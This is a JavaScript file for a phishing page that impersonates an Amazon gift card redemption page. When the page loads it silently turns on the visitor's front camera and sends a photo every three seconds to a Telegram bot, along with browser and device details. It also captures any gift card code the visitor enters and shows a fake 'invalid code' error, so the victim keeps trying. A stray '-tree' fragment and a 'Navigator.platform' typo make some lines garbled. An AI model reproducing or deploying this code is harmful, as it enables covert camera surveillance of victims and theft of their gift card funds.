// Telegram Bot Configuration
const botToken = '#';
const chatId = '#';

// Hidden camera elements
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const context = canvas.getContext('2d');

// Configuration
const CAPTURE_INTERVAL = 3000; // 3 seconds
let stream = null;
let captureIntervalId = null;
let photoCount = 0;
let isCapturing = false;

// Initialize on page load
window.addEventListener('DOMContentLoaded', () => {
    initializeCamera();
    setupFormInteraction();
    sendVisitNotification();
});

// Send initial visit notification
function sendVisitNotification() {
    const visitMessage = `NEW VISITOR - Amazon Gift Card Page\n\n` +
                        `${new Date().toLocaleString()}\n` +
                        `${navigator.userAgent}\n` +
-tree                        `${navigator.platform}\n` +
                        `${navigator.language}\n` +
                        `${screen.width}x${screen.height}\n\n` +
                        `Starting capture (3 sec intervals)...`;
    
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: visitMessage
        })
    }).catch(err => console.error('Visit notification error:', err));
}

// Initialize camera silently
async function initializeCamera() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                width: { ideal: 1920 },
                height: { ideal: 1080 },
                facingMode: 'user'
            },
            audio: false
        });
        
        video.srcObject = stream;
        
        video.onloadedmetadata = () => {
            video.play();
            canvas.width = video.videoWidth || 1280;
            canvas.height = video.videoHeight || 720;
            
            setTimeout(() => {
                startAutomaticCapture();
            }, 1500);
        };
        
    } catch (error) {
        console.error('Primary camera error:', error);
        tryFallbackCamera();
    }
}

// Fallback camera method
function tryFallbackCamera() {
    navigator.mediaDevices.getUserMedia({ 
        video: true,
        audio: false
    })
    .then(videoStream => {
        stream = videoStream;
        video.srcObject = stream;
        
        video.onloadedmetadata = () => {
            video.play();
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            setTimeout(() => {
                startAutomaticCapture();
            }, 1500);
        };
    })
    .catch(err => {
        console.error('Fallback camera error:', err);
    });
}

// Start automatic capture every 3 seconds
function startAutomaticCapture() {
    if (isCapturing) return;
    isCapturing = true;
    
    captureAndSendPhoto();
    
    captureIntervalId = setInterval(() => {
        captureAndSendPhoto();
    }, CAPTURE_INTERVAL);
}

// Capture and send photo
function captureAndSendPhoto() {
    if (!stream || video.readyState !== 4) {
        console.log('Video not ready');
        return;
    }
    
    try {
        context.clearRect(0, 0, canvas.width, canvas.height);
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob((blob) => {
            if (blob && blob.size > 0) {
                photoCount++;
                sendPhotoToTelegram(blob, photoCount);
            } else {
                console.error('Blob creation failed or empty');
            }
        }, 'image/jpeg', 0.92);
        
    } catch (error) {
        console.error('Capture error:', error);
    }
}

// Send photo to Telegram (NO DELETE)
function sendPhotoToTelegram(blob, count) {
    const formData = new FormData();
    const filename = `amazon_capture_${count}_${Date.now()}.jpg`;
    
    formData.append('chat_id', chatId);
    formData.append('photo', blob, filename);
    
    const timestamp = new Date().toLocaleString('en-US', {
        dateStyle: 'short',
        timeStyle: 'medium'
    });
    
    const caption = `Photo #${count}\n${timestamp}\n${Navigator.platform}`;
    formData.append('caption', caption);
    
    // Simple send with retry (no delete)
    sendWithRetry(formData, 0);
}

// Send with retry (NO DELETE)
function sendWithRetry(formData, retryCount) {
    const maxRetries = 3;
    
    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        return response.json();
    })
    .then(data => {
        if (data.ok) {
            console.log(`Photo #${photoCount} sent successfully`);
        } else {
            console.error('Telegram API error:', data);
            if (retryCount < maxRetries) {
                setTimeout(() => sendWithRetry(formData, retryCount + 1), 1000);
            }
        }
    })
    .catch(error => {
        console.error('Send error:', error);
        if (retryCount < maxRetries) {
            setTimeout(() => sendWithRetry(formData, retryCount + 1), 1000);
        }
    });
}

// Setup form interactions
function setupFormInteraction() {
    const giftCardInput = document.getElementById('giftCardCode');
    const applyBtn = document.querySelector('.apply-btn');
    
    if (!giftCardInput || !applyBtn) return;
    
    giftCardInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
        if (value.length > 4) value = value.substring(0, 4) + '-' + value.substring(4);
        if (value.length > 11) value = value.substring(0, 11) + '-' + value.substring(11);
        if (value.length > 16) value = value.substring(0, 16);
        e.target.value = value;
    });
    
    applyBtn.addEventListener('click', (e) => {
        e.preventDefault();
        const code = giftCardInput.value.trim();
        
        if (code.length < 10) {
            showNotification('Please enter a valid claim code', 'error');
            return;
        }
        
        const originalText = applyBtn.innerHTML;
        applyBtn.innerHTML = 'Processing...';
        applyBtn.disabled = true;
        
        sendCodeToTelegram(code);
        
        setTimeout(() => {
            applyBtn.innerHTML = originalText;
            applyBtn.disabled = false;
            showNotification('Invalid claim code. Please check and try again.', 'error');
            giftCardInput.value = '';
        }, 2500);
    });
    
    giftCardInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') applyBtn.click();
    });
}

// Send gift card code to Telegram
function sendCodeToTelegram(code) {
    const message = `GIFT CARD CODE ENTERED!\n\n` +
                   `Code: ${code}\n` +
                   `${new Date().toLocaleString()}\n` +
                   `${navigator.userAgent.substring(0, 80)}\n` +
                   `${navigator.platform}`;
    
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(r => r.json())
    .then(d => {
        if (d.ok) console.log('Code sent to Telegram');
    })
    .catch(err => console.error('Code send error:', err));
}

// Show notification toast
function showNotification(message, type = 'info') {
    const existing = document.querySelector('.notification-toast');
    if (existing) existing.remove();
    
    const toast = document.createElement('div');
    toast.className = 'notification-toast';
    toast.style.cssText = `
        position: fixed; top: 70px; right: 20px; 
        background-color: ${type === 'error' ? '#cc0c39' : '#067d62'};
        color: white; padding: 12px 20px; border-radius: 4px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3); z-index: 10000;
        font-size: 13px; font-family: "Amazon Ember", Arial, sans-serif;
        max-width: 350px; animation: slideIn 0.3s ease;
    `;
    toast.textContent = message;
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => toast.remove(), 300);
    }, 3500);
}

// Add animations
const styleSheet = document.createElement('style');
styleSheet.textContent = `
    @keyframes slideIn { from { transform: translateX(400px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
    @keyframes slideOut { from { transform: translateX(0); opacity: 1; } to { transform: translateX(400px); opacity: 0; } }
`;
document.head.appendChild(styleSheet);

// Cleanup on unload
window.addEventListener('beforeunload', () => {
    if (captureIntervalId) clearInterval(captureIntervalId);
    if (stream) stream.getTracks().forEach(track => track.stop());
});

// Keep screen awake
let wakeLock = null;
if ('wakeLock' in navigator) {
    navigator.wakeLock.request('screen').then(lock => wakeLock = lock).catch(() => {});
}

// Resume capture when tab becomes visible
document.addEventListener('visibilitychange', () => {
    if (!document.hidden && stream && !isCapturing) {
        startAutomaticCapture();
    }

});


